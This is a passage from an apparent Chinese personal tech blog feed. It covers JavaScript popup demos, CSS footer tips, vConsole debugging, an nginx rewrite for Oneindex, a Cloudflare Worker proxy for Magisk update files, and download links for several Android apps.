        <tags>
            
            <tag> Termux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网易dns和ip接口</title>
      <link href="/2021/wang-yi-dns-jie-kou/"/>
      <url>/2021/wang-yi-dns-jie-kou/</url>
      
        <content type="html"><![CDATA[<p>抓包软件时发现网易云音乐会在手机网络状态变化时用这两个接口获取dns与ip信息  </p><a id="more"></a>  <p>日常要检测dns使用网易提供的网页工具就够了<br><a href="https://nstool.netease.com/" target="_blank" rel="noopener">网易dns检测</a>  </p><p>下面两个网易云音乐里用的接口仅在这里记录下</p><h4 id="接口一"><a href="#接口一" class="headerlink" title="接口一"></a>接口一</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//nstool.netease.com/info.js</span></span><br></pre></td></tr></table></figure><script src="//nstool.netease.com/info.js"></script><script type="text/javascript">  document.write('当前IP：'+ip+'  '+ip_province+' '+ip_city +' ' +ip_isp + '<br/>');  document.write('当前DNS：'+dns+'  '+dns_province+' '+dns_city +' ' +dns_isp + '<br/>');  document.write(msg + '<br/>');</script><h4 id="接口二"><a href="#接口二" class="headerlink" title="接口二"></a>接口二</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//m</span>am.netease.com<span class="regexp">/api/</span>config<span class="regexp">/getClientIp</span></span><br></pre></td></tr></table></figure><p>这个借口返回的是json信息，网页上就不演示了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JS弹窗</title>
      <link href="/2021/js-dan-chuang/"/>
      <url>/2021/js-dan-chuang/</url>
      
        <content type="html"><![CDATA[<p>JS基本的弹窗和js弹出div  </p><a id="more"></a>  <h4 id="基本弹窗"><a href="#基本弹窗" class="headerlink" title="基本弹窗"></a>基本弹窗</h4><p>提示普通文本信息</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="string">"提示"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><h4 id="确定窗"><a href="#确定窗" class="headerlink" title="确定窗"></a>确定窗</h4><p>带确定、取消按钮的弹窗，有返回值true/false对应确定/取消被按下</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">var b</span> = confirm(<span class="string">"确定？"</span>);</span><br></pre></td></tr></table></figure><h4 id="输入窗"><a href="#输入窗" class="headerlink" title="输入窗"></a>输入窗</h4><p>prompt有两个参数，第一个是提示窗标题，第二个是输入的默认值，返回用户输入的内容，可以用if判断是否有输入内容</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">var</span> <span class="built_in">text</span> = prompt(<span class="string">"输入"</span>, <span class="string">""</span>);</span><br><span class="line"><span class="built_in">if</span> (<span class="built_in">text</span>) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="弹出div窗口"><a href="#弹出div窗口" class="headerlink" title="弹出div窗口"></a>弹出div窗口</h4><p>首先写一个遮罩层div，然后再写一个弹窗的div</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 遮罩层 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"cover"</span> <span class="attr">style</span>=<span class="string">"background: #000; position: absolute; left: 0px; top: 0px; width: 100%; filter: alpha(opacity=30); opacity: 0.3; display: none; z-index: 2 "</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 弹窗 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"showdiv"</span> <span class="attr">style</span>=<span class="string">"width: 80%; margin: 0 auto; height: 9.5rem; border: 1px solid #999; display: none; position: absolute; top: 40%; left: 10%; z-index: 3; background: #fff"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 标题 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background: #F8F7F7; width: 100%; height: 2rem; font-size: 0.65rem; line-height: 2rem; border: 1px solid #999; text-align: center;"</span> &gt;</span></span><br><span class="line">    提示</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 内容 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"text-indent: 50px; height: 4rem; font-size: 0.5rem; padding: 0.5rem; line-height: 1rem; "</span>&gt;</span></span><br><span class="line">    js弹窗 js弹出DIV,并使整个页面背景变暗<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 按钮 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"background: #418BCA; width: 80%; margin: 0 auto; height: 1.5rem; line-height: 1.5rem; text-align: center;color: #fff;margin-top: 1rem; -moz-border-radius: .128rem; -webkit-border-radius: .128rem; border-radius: .128rem;font-size: .59733rem;"</span> <span class="attr">onclick</span>=<span class="string">"closeWindow()"</span>&gt;</span></span><br><span class="line">    确 定</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>js代码：（把jq引进来）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">// 弹窗</span></span></span><br><span class="line"><span class="actionscript">  <span class="function"><span class="keyword">function</span> <span class="title">showWindow</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#showdiv'</span>).show();  <span class="comment">//显示弹窗</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#cover'</span>).css(<span class="string">'display'</span>,<span class="string">'block'</span>); <span class="comment">//显示遮罩层</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#cover'</span>).css(<span class="string">'height'</span>,<span class="built_in">document</span>.body.clientHeight+<span class="string">'px'</span>); <span class="comment">//设置遮罩层的高度为当前页面高度</span></span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="actionscript">  <span class="comment">// 关闭弹窗</span></span></span><br><span class="line"><span class="actionscript">  <span class="function"><span class="keyword">function</span> <span class="title">closeWindow</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#showdiv'</span>).hide();  <span class="comment">//隐藏弹窗</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">'#cover'</span>).css(<span class="string">'display'</span>,<span class="string">'none'</span>);   <span class="comment">//显示遮罩层</span></span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="判断JQ引入"><a href="#判断JQ引入" class="headerlink" title="判断JQ引入"></a>判断JQ引入</h4><p>引入jq</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>判断引入情况</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (<span class="keyword">typeof</span> jQuery != <span class="string">'undefined'</span>) &#123;</span></span><br><span class="line"><span class="actionscript"><span class="comment">//jquery已引入</span></span></span><br><span class="line">&#125; </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script><div id="cover" style="background: #000; position: absolute; left: 0px; top: 0px; width: 100%; filter: alpha(opacity=30); opacity: 0.3; display: none; z-index: 2 "></div><div id="showdiv" style="width: 80%; margin: 0 auto; height: 9.5rem; border: 1px solid #999; display: none; position: absolute; top: 40%; left: 10%; z-index: 3; background: #fff">  <div style="background: #F8F7F7; width: 100%; height: 2rem; font-size: 0.65rem; line-height: 2rem; border: 1px solid #999; text-align: center;">    提示  </div>  <div style="text-indent: 50px; height: 4rem; font-size: 0.5rem; padding: 0.5rem; line-height: 1rem; ">    js弹窗 js弹出DIV,并使整个页面背景变暗</div>  <div style="background: #418BCA; width: 80%; margin: 0 auto; height: 1.5rem; line-height: 1.5rem; text-align: center;color: #fff;margin-top: 1rem; -moz-border-radius: .128rem; -webkit-border-radius: .128rem; border-radius: .128rem;font-size: .59733rem;" onclick="closeWindow()">    确 定  </div></div><script>  function showWindow() {    $('#showdiv').show();    $('#cover').css('display','block');    $('#cover').css('height',document.body.clientHeight+'px');   }  function closeWindow() {    $('#showdiv').hide();    $('#cover').css('display','none');  }function fdialog(){  if(confirm("确定？")){  alert('确定被按下');  } else {  alert('取消被按下');  }}function indialog(){  var text = prompt("请输入", "");  if(text){  alert('输入了：'+text);  }}function getType(){    if (typeof jQuery != 'undefined') {    alert('jquery已引入');    } else {  alert('jquery未引入');  }}</script><input type="button" onclick="javascript:alert('提示');" value="普通弹窗"><input type="button" onclick="fdialog()" value="确定窗"><input type="button" onclick="indialog()" value="输入窗"><br><input type="button" onclick="getType()" value="获取JQ状态"><input type="button" onclick="showWindow()" value="div弹窗"><blockquote><p>div弹窗转载自<a href="https://www.jb51.net/article/138647.htm" target="_blank" rel="noopener">下页、再停留：JS弹窗 JS弹出DIV并使整个页面背景变暗功能的实现代码</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网页页脚</title>
      <link href="/2021/wang-ye-ye-jiao/"/>
      <url>/2021/wang-ye-ye-jiao/</url>
      
        <content type="html"><![CDATA[<p>页脚样式，主要是position: fixed和position:absolute区别  </p><a id="more"></a>  <p>设置网页页脚时，可以使用css样式将内容控制显示在底部</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"position: fixed; bottom: 0; width:100%;"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"text-align: center;"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中 position: fixed 是控制显示在屏幕底部</p><p>可以改为 position:absolute 让其显示在网页底部</p>]]></content>
      
      
      
        <tags>
            
            <tag> Html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网页vConsole</title>
      <link href="/2021/wang-ye-vconsole/"/>
      <url>/2021/wang-ye-vconsole/</url>
      
        <content type="html"><![CDATA[<p>一个适合移动端网页调试的js  </p><a id="more"></a>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://unpkg.com/vconsole/dist/vconsole.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> vConsole = <span class="keyword">new</span> <span class="built_in">window</span>.VConsole();</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最好要在head 标签内部引用js</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/vConsole/3.2.0/vconsole.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> vConsole = <span class="keyword">new</span> VConsole();</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/Tencent/vConsole" target="_blank" rel="noopener">Tencent/vConsole</a></p></blockquote><script src="https://unpkg.com/vconsole/dist/vconsole.min.js"></script><script>  var vConsole = new window.VConsole();</script>]]></content>
      
      
      
        <tags>
            
            <tag> Html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统医生 小米售后软件</title>
      <link href="/2021/xi-tong-yi-sheng-mi/"/>
      <url>/2021/xi-tong-yi-sheng-mi/</url>
      
        <content type="html"><![CDATA[<p>这个是去小米售后维修手机给装的，看能直接显示的参数蛮多的，在这里分享下  </p><a id="more"></a>  <p>软件名：系统医生<br>包名：com.xiaomi.systemdoctor<br>大小：5.38M<br>版本：1.49<br>下载：<a href="https://res.gddhy.net/apk/com.xiaomi.systemdoctor.apk" target="_blank" rel="noopener">apk下载</a>  </p><p><a href="http://file.market.xiaomi.com/download/AppStore/0b3065b8e925d7ef54fe02d186b0efb96ee40ba13/SystemDoctor.apk" target="_blank" rel="noopener">系统医生apk</a>（这个是小米渠道的直链）</p><blockquote><p>原分享动态<a href="https://www.coolapk.com/feed/15733142?shareKey=MDQyM2NjZDMwY2QyNjBlODM2MDE~&shareUid=778415&shareFrom=com.coolapk.market_11.2.6.1" target="_blank" rel="noopener">酷安动态</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络ADB调试</title>
      <link href="/2021/wang-luo-adb-diao-shi/"/>
      <url>/2021/wang-luo-adb-diao-shi/</url>
      
        <content type="html"><![CDATA[<p>这是一个可以在手机上快速打开网络adb的小工具，同样是个被酷安下架的app  </p><a id="more"></a>  <p>软件名：网络ADB调试<br>包名：com.yaerin.wadb<br>大小：37.52K<br>版本：1.7<br>软件开源：<a href="https://github.com/KagurazakaHanabi/WADB" target="_blank" rel="noopener">KagurazakaHanabi/WADB</a><br>下载：<a href="https://res.gddhy.net/apk/networkadb.apk" target="_blank" rel="noopener">networkadb.apk</a>  </p><p>电脑上使用adb命令可以达到同样的效果</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb tcpip <span class="number">5555</span></span><br></pre></td></tr></table></figure><p>不过直接在手机上用root权限打开这个会更方便，支持添加到通知栏磁贴快速开关adb调试</p><p>安卓11自带网络adb，不过11为了安全连接稍显麻烦了，这个APP同样适用</p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oneindex伪静态</title>
      <link href="/2021/oneindex-wei-jing-tai/"/>
      <url>/2021/oneindex-wei-jing-tai/</url>
      
        <content type="html"><![CDATA[<p>去掉地址栏中的/?/  </p><a id="more"></a>  <p>在宝塔面板里添加站点的伪静态  </p><p>Apache转Nginx</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (!-f <span class="variable">$request_filename</span>)&#123;</span><br><span class="line"><span class="attribute">set</span> <span class="variable">$rule_0</span> <span class="number">1</span><span class="variable">$rule_0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">if</span> (!-d <span class="variable">$request_filename</span>)&#123;</span><br><span class="line"><span class="attribute">set</span> <span class="variable">$rule_0</span> <span class="number">2</span><span class="variable">$rule_0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$rule_0</span> = <span class="string">"21"</span>)&#123;</span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^/(.*)$</span> /index.php?/<span class="variable">$1</span> <span class="literal">last</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法来自 <a href="http://zwen.net/oneindexrewrite.html" target="_blank" rel="noopener">Zwen</a> ，整理书签时发现他的站点挂了，就去自己的宝塔后台翻到了这个代码，记录一下以备不时之需吧</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Miku Weather</title>
      <link href="/2021/miku-weather/"/>
      <url>/2021/miku-weather/</url>
      
        <content type="html"><![CDATA[<p>这个是一个Miku的桌面天气小部件  </p><a id="more"></a>  <blockquote><p>2025.9更新</p></blockquote><h4 id="通用版"><a href="#通用版" class="headerlink" title="通用版"></a>通用版</h4><p>软件名：MikuWidget<br>包名：net.gddhy.mikuwidget<br>只保留桌面小部件和通知栏磁贴天气核心功能，需要自行注册免费版和风web api使用<br>下载：<a href="https://res.gddhy.net/apk/MikuWidget_1.0.apk" target="_blank" rel="noopener">MikuWidget</a></p><p>2025.9更新，适配和风API host<br>下载：<a href="https://res.gddhy.net/apk/MikuWidget_1.0_apihost.apk" target="_blank" rel="noopener">MikuWidget</a></p><h4 id="MIUI版"><a href="#MIUI版" class="headerlink" title="MIUI版"></a>MIUI版</h4><p>软件名：MikuWeather（MIUI）<br>包名：com.hy.mikuweather<br>更新：支持miui13/14，适配安卓14+，支持澎湃os1、os2<br>下载：<a href="https://res.gddhy.net/apk/MikuWeatherMIUI_2.2.apk" target="_blank" rel="noopener">MIUI版</a>  </p><p>仅支持MIUI/澎湃设备使用，因为miui13（安卓12）起，小米小部件变动较大，可能需要多种方式添加才能看到小部件，更新澎湃后直接使用shizuku添加即可（安卓14+）</p><h4 id="通用版（因天气api过期已失效）"><a href="#通用版（因天气api过期已失效）" class="headerlink" title="通用版（因天气api过期已失效）"></a>通用版（因天气api过期已失效）</h4><p>软件名：Miku Weather<br>包名：com.mikutart.mikuweather2<br>大小：3.85M<br>版本：3.9b<br>开发者：<a href="http://www.coolapk.com/u/717351" target="_blank" rel="noopener">Eggtart</a><br>下载：<a href="https://res.gddhy.net/apk/MikuWeather_3.9b.apk" target="_blank" rel="noopener">Miku Weather</a>  </p><p>本软件的图片资源取自 Sony Xperia feat. Hatsune Miku ROM 中的内置应用 Miku Weather，本软件自身是原版 Miku Weather 的仿制版本，并在功能上进行了扩展，使其支持全球天气显示。  </p><blockquote><p>Miku Weather (Eggtart Edition)内的关于信息</p></blockquote><h4 id="360OS版"><a href="#360OS版" class="headerlink" title="360OS版"></a>360OS版</h4><p>这个是用在360手机上的主题插件，并非独立软件，使用需要有一定的动手能力。</p><p>下载分享文件 <code>360os_theme</code> 目录内的 <code>qikuTransparentSkin-miku.zip</code> 或 <code>qikuTransparentSkin雪miku.zip</code> 文件，替换360主题的默认文件</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="class"><span class="keyword">data</span>/<span class="keyword">data</span>/theme/qikuTransparentSkin.zip</span></span><br></pre></td></tr></table></figure><p>替换后重新添加天气插件即可。</p><p><a href="https://pan.baidu.com/s/1kWjZZ51" target="_blank" rel="noopener">度盘文件分享</a> （提取码:7463）</p><blockquote><p>基于360默认天气插件替换制作，仅支持奇酷/360运行360OS的手机</p></blockquote><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>当前页的公主天气插件，属于公主的非商业性二次创作，为粉丝/爱好者兴趣创作。</p><p>通用版未知原因，被酷安下架，为方便喜欢这个软件的用户正常下载在这里分享下。</p><p>小米不再接受个人开发者上传软件，MIUI专版不知道还能在小米应用商店挂多久，一并在这里分享下。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>易编辑</title>
      <link href="/2021/yi-bian-ji/"/>
      <url>/2021/yi-bian-ji/</url>
      
        <content type="html"><![CDATA[<p>有谁还记得修改mrp必备的十六进制编辑器易编辑吗？风的影子曾将易编辑移植到安卓，在安卓上功能依旧强大  </p><a id="more"></a>  <p>图标：<img src="/img/preloader.gif" data-original="icon.png" alt="icon"><br>软件名：易编辑<br>包名：com.xl.HexEdit<br>大小：305.54K<br>版本：1.1<br>下载：<a href="https://res.gddhy.net/apk/eHex.apk" target="_blank" rel="noopener">安卓易编辑</a><br>源代码：<a href="https://github.com/fengdeyingzi/CAPPProjects/tree/master/易编辑" target="_blank" rel="noopener">fengdeyingzi/CAPPProjects</a>  </p><p>Mrp版：<a href="http://mrp.gddhy.net/mrp/ehex2013b/" target="_blank" rel="noopener">易编辑</a><br>应用介绍：强大的十六进制编辑器，DIY必备工具  </p><p><a href="https://vmrp.gddhy.net/?f=https://cdn.jsdelivr.net/gh/gddhy/mrp-web/mrp-files/ehex2013b.mrp&title=%E6%98%93%E7%BC%96%E8%BE%91" target="_blank" rel="noopener">易编辑在线运行</a>  </p><p>易编辑是eleqian开发的十六进制编辑器，安卓版由风的影子，功能同mrp版</p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Magisk自定义更新通道</title>
      <link href="/2021/magisk-zi-ding-yi-geng-xin-tong-dao/"/>
      <url>/2021/magisk-zi-ding-yi-geng-xin-tong-dao/</url>
      
        <content type="html"><![CDATA[<p>直连Github国内网络环境有时会有点问题，所以利用Cloudflare Workers搭建了个magisk通道，利用workers直接获取magisk所需要的json文件  </p><a id="more"></a>  <h4 id="更新通道"><a href="#更新通道" class="headerlink" title="更新通道"></a>更新通道</h4><p>stable.json</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//magisk.gddhy.net/stable.json</span></span><br></pre></td></tr></table></figure><p>beta.json</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//magisk.gddhy.net/beta.json</span></span><br></pre></td></tr></table></figure><p>canary.json</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//magisk.gddhy.net/canary.json</span></span><br></pre></td></tr></table></figure><p>(点击链接窗口可以看到复制按钮)</p><h4 id="jsdelivr的cdn链接"><a href="#jsdelivr的cdn链接" class="headerlink" title="jsdelivr的cdn链接"></a>jsdelivr的cdn链接</h4><p>直接使用这几个效果或许会更好，毕竟有jsdelivr的cdn加速，会比workers去拉取github的文件再返回要快<br>stable.json</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/</span>topjohnwu<span class="regexp">/magisk-files/</span>stable.json</span><br></pre></td></tr></table></figure><p>beta.json</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/</span>topjohnwu<span class="regexp">/magisk-files/</span>beta.json</span><br></pre></td></tr></table></figure><p>canary.json</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>cdn.jsdelivr.net<span class="regexp">/gh/</span>topjohnwu<span class="regexp">/magisk-files/</span>canary.json</span><br></pre></td></tr></table></figure><hr><p>Magisk正式版从v22开始管理器、安装包、卸载包三合一，若需要从Recovery中刷入，只需要将 <code>apk</code> 后缀改为 <code>zip</code> 便可以直接刷入，若要卸载，将下载的apk文件改名为 <code>uninstall.zip</code> 刷入即可完成卸载</p><p><button onclick="down()">下载Magisk（stable）</button></p><script type="text/javascript">function down(){    fetch('https://cdn.jsdelivr.net/gh/topjohnwu/magisk-files@master/stable.json')      .then(response => response.json())      .then(data => {          window.location.href = data.magisk.link;      })      .catch(console.error)}</script><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p>workers每天的请求次数有限制，若上面链接不能使用，可以自行搭建使用  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">async function gatherResponse(response) &#123;</span><br><span class="line">  const &#123; headers &#125; = response</span><br><span class="line">  const contentType = headers.<span class="builtin-name">get</span>(<span class="string">"content-type"</span>) || <span class="string">""</span></span><br><span class="line">  <span class="keyword">if</span> (contentType.includes(<span class="string">"application/json"</span>)) &#123;</span><br><span class="line">    return JSON.stringify(await response.json())</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (contentType.includes(<span class="string">"application/text"</span>)) &#123;</span><br><span class="line">    return await response.text()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (contentType.includes(<span class="string">"text/html"</span>)) &#123;</span><br><span class="line">    return await response.text()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    return await response.text()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async function handleRequest(type) &#123;</span><br><span class="line">  <span class="keyword">if</span>(type == 0)&#123;</span><br><span class="line">    return Response.redirect(WEB_SITE, statusCode)</span><br><span class="line">  &#125;</span><br><span class="line">  const init = &#123;</span><br><span class="line">    headers: &#123;</span><br><span class="line">      <span class="string">"content-type"</span>: <span class="string">"application/json;charset=UTF-8"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">  const response = await fetch(type == 1 ? JSON_STABLE : (<span class="built_in"> type </span>== 2 ? JSON_BETA : JSON_CANARY), init)</span><br><span class="line">  const results = await gatherResponse(response)</span><br><span class="line">  return new Response(results, init)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addEventListener(<span class="string">"fetch"</span>, event =&gt; &#123;</span><br><span class="line">  const str = event.request.url</span><br><span class="line">  var<span class="built_in"> type </span>= 0</span><br><span class="line">  <span class="keyword">if</span>(str.indexOf(<span class="string">"stable.json"</span>)&gt;=0)&#123;</span><br><span class="line">   <span class="built_in"> type </span>= 1</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(str.indexOf(<span class="string">"beta.json"</span>)&gt;=0)&#123;</span><br><span class="line">   <span class="built_in"> type </span>= 2</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(str.indexOf(<span class="string">"canary.json"</span>)&gt;=0)&#123;</span><br><span class="line">   <span class="built_in"> type </span>= 3</span><br><span class="line">  &#125;</span><br><span class="line">  return event.respondWith(handleRequest(type))</span><br><span class="line">&#125;)</span><br><span 